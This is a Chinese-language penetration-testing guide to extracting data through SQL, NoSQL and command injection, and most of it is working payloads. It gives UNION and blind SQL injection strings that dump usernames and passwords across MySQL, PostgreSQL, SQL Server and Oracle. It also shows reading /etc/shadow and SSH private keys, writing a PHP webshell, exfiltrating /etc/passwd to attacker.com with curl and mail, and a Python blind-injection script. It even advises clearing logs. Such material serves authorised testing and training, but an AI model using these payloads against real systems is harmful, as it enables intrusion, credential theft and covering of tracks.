# 数据提取技术方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供注入漏洞数据提取技术的系统化方法，帮助在发现漏洞后高效、完整地提取目标数据。

## 1.2 适用范围
适用于 SQL 注入、NoSQL 注入、命令注入等场景下的数据提取。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：数据提取技术

### 2.1 技术介绍

数据提取是注入漏洞利用的核心目标之一，包括数据库结构探测、表名/列名获取、数据内容提取等技术。

### 2.2 数据库结构探测

#### 2.2.1 获取数据库信息

**MySQL：**
```sql
-- 当前数据库
SELECT database();

-- 所有数据库
SELECT schema_name FROM information_schema.schemata;

-- 数据库版本
SELECT version();

-- 当前用户
SELECT user();

-- 主机名
SELECT @@hostname;
```

**PostgreSQL：**
```sql
-- 当前数据库
SELECT current_database();

-- 所有数据库
SELECT datname FROM pg_database;

-- 版本
SELECT version();

-- 当前用户
SELECT current_user;
```

**SQL Server：**
```sql
-- 当前数据库
SELECT DB_NAME();

-- 所有数据库
SELECT name FROM sys.databases;

-- 版本
SELECT @@version;

-- 当前用户
SELECT SYSTEM_USER;
```

**Oracle：**
```sql
-- 当前用户
SELECT user FROM dual;

-- 所有用户
SELECT username FROM all_users;

-- 版本
SELECT * FROM v$version;
```

#### 2.2.2 获取表名

**MySQL：**
```sql
-- 当前数据库的所有表
SELECT table_name FROM information_schema.tables 
WHERE table_schema = database();

-- 指定数据库的表
SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'target_db';

-- 表注释
SELECT table_name, table_comment FROM information_schema.tables 
WHERE table_schema = database();
```

**PostgreSQL：**
```sql
-- 所有表
SELECT tablename FROM pg_tables 
WHERE schemaname = 'public';
```

**SQL Server：**
```sql
-- 所有表
SELECT table_name FROM information_schema.tables;

-- 或
SELECT name FROM sysobjects WHERE xtype='U';
```

#### 2.2.3 获取列名

**MySQL：**
```sql
-- 指定表的所有列
SELECT column_name FROM information_schema.columns 
WHERE table_name = 'users';

-- 列详细信息
SELECT column_name, data_type, column_comment 
FROM information_schema.columns 
WHERE table_name = 'users';
```

**PostgreSQL：**
```sql
-- 指定表的列
SELECT column_name FROM information_schema.columns 
WHERE table_name = 'users';
```

**SQL Server：**
```sql
-- 指定表的列
SELECT column_name FROM information_schema.columns 
WHERE table_name = 'users';
```

### 2.3 数据提取方法

#### 2.3.1 联合查询提取

**适用场景：** 错误回显注入、联合查询注入

**MySQL 示例：**
```sql
-- 基础联合查询
' UNION SELECT 1,2,3--

-- 提取数据库名
' UNION SELECT 1,database(),version()--

-- 提取表名（逐行）
' UNION SELECT 1,table_name,3 FROM information_schema.tables 
  WHERE table_schema=database() LIMIT 0,1--

-- 提取列名
' UNION SELECT 1,column_name,3 FROM information_schema.columns 
  WHERE table_name='users' LIMIT 0,1--

-- 提取用户数据
' UNION SELECT 1,username,password FROM users--

-- 多行数据（GROUP_CONCAT）
' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users--
```

**PostgreSQL 示例：**
```sql
-- 多行数据（STRING_AGG）
' UNION SELECT 1,STRING_AGG(username,','),STRING_AGG(password,',') FROM users--
```

**SQL Server 示例：**
```sql
-- 多行数据（FOR XML PATH）
' UNION SELECT 1,(SELECT username+',' FROM users FOR XML PATH('')),3--
```

#### 2.3.2 盲注提取

**布尔盲注：**
```sql
-- 逐字符提取
AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='d'

-- 二分法优化
AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100
AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))<120
```

**时间盲注：**
```sql
-- MySQL
AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(2), 0)

-- SQL Server
; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' WAITFOR DELAY '0:0:2'--

-- PostgreSQL
; SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' 
  THEN pg_sleep(2) ELSE pg_sleep(0) END--
```

#### 2.3.3 文件读写提取

**MySQL 读取文件：**
```sql
-- 读取文件
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/Windows/win.ini');

-- 读取到变量
SELECT LOAD_FILE('/etc/shadow') INTO @file;
SELECT @file;
```

**MySQL 写入文件：**
```sql
-- 写入 Webshell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php';

-- 写入计划任务
SELECT 'command' INTO OUTFILE '/tmp/cron_job';
```

**PostgreSQL 读取文件：**
```sql
-- 读取文件
SELECT pg_read_file('/etc/passwd', 0, 1000);

-- COPY 读取
COPY (SELECT version()) TO '/tmp/output.txt';
```

#### 2.3.4 命令执行提取

**命令注入直接读取：**
```bash
# Linux
; cat /etc/passwd
; head -100 /var/log/auth.log

# Windows
& type C:\Windows\win.ini
& more C:\Users\username\.ssh\id_rsa
```

**命令执行数据外带：**
```bash
# DNSLog 外带
; curl http://attacker.com/$(cat /etc/passwd | base64)

# HTTP POST 外带
; curl -X POST -d @/etc/passwd http://attacker.com/

# 邮件外带
; mail attacker@email.com < /etc/passwd
```

### 2.4 高级提取技术

#### 2.4.1 大量数据提取

**分块提取：**
```sql
-- 使用 LIMIT 分页
SELECT * FROM users LIMIT 0,100;
SELECT * FROM users LIMIT 100,100;
SELECT * FROM users LIMIT 200,100;

-- 使用 ID 范围
SELECT * FROM users WHERE id > 0 AND id <= 100;
SELECT * FROM users WHERE id > 100 AND id <= 200;
```

**并行提取：**
```
# 使用多个并发请求
# 请求 1: 提取 id 1-1000 的数据
# 请求 2: 提取 id 1001-2000 的数据
# 请求 3: 提取 id 2001-3000 的数据
```

#### 2.4.2 二进制数据提取

**Base64 编码提取：**
```sql
-- MySQL
SELECT TO_BASE64(LOAD_FILE('/path/to/binary'));

-- PostgreSQL
SELECT encode(pg_read_binary_file('/path/to/binary'), 'base64');
```

**十六进制提取：**
```sql
-- MySQL
SELECT HEX(LOAD_FILE('/path/to/binary'));

-- 转换回二进制
UNHEX('hex_data')
```

#### 2.4.3 跨数据库提取

**MySQL 访问其他数据库：**
```sql
SELECT * FROM other_db.users;
```

**PostgreSQL 跨数据库：**
```sql
-- 需要 dblink 扩展
SELECT * FROM dblink('dbname=other_db', 'SELECT * FROM users') AS t(id int, name text);
```

**SQL Server 跨服务器：**
```sql
-- 链接服务器
SELECT * FROM linked_server.database.dbo.users;
```

### 2.5 自动化提取工具

#### 2.5.1 SQLMap 数据提取

```bash
# 获取所有数据库
sqlmap -u "http://target/page?id=1" --dbs

# 获取指定数据库的表
sqlmap -u "http://target/page?id=1" -D database --tables

# 获取指定表的列
sqlmap -u "http://target/page?id=1" -D database -T users --columns

# 获取指定列的数据
sqlmap -u "http://target/page?id=1" -D database -T users -C username,password --dump

# 获取所有数据
sqlmap -u "http://target/page?id=1" --dump-all

# 指定范围
sqlmap -u "http://target/page?id=1" --start 1 --stop 100

# 并行提取
sqlmap -u "http://target/page?id=1" --threads 5
```

#### 2.5.2 自定义提取脚本

```python
import requests
import string

def extract_data(url, query, length):
    """盲注数据提取"""
    result = ""
    chars = string.ascii_letters + string.digits + "_@."
    
    for i in range(1, length + 1):
        for char in chars:
            payload = f"{query} AND SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{char}'"
            response = requests.get(url + "?" + payload)
            
            if "found" in response.text:  # 根据实际响应调整
                result += char
                print(f"Position {i}: {char}")
                break
    
    return result
```

### 2.6 提取注意事项

1. **合法性**：仅在授权范围内进行数据提取
2. **最小影响**：避免大量数据提取影响业务
3. **敏感数据处理**：妥善保护提取的敏感数据
4. **日志清理**：清理测试产生的日志记录
5. **完整记录**：记录提取过程和结果用于报告

---

# 第三部分：附录

## 3.1 信息收集 SQL 速查表

```sql
-- MySQL 信息收集
SELECT database();                    -- 当前数据库
SELECT user();                        -- 当前用户
SELECT version();                     -- 版本
SELECT @@hostname;                    -- 主机名
SELECT schema_name FROM information_schema.schemata;  -- 所有数据库
SELECT table_name FROM information_schema.tables WHERE table_schema=database();  -- 所有表
SELECT column_name FROM information_schema.columns WHERE table_name='users';  -- 所有列

-- SQL Server 信息收集
SELECT DB_NAME();                     -- 当前数据库
SELECT SYSTEM_USER;                   -- 当前用户
SELECT @@version;                     -- 版本
SELECT name FROM sys.databases;       -- 所有数据库
SELECT name FROM sysobjects WHERE xtype='U';  -- 所有表
```

## 3.2 参考资源

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://sqlmap.org/)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
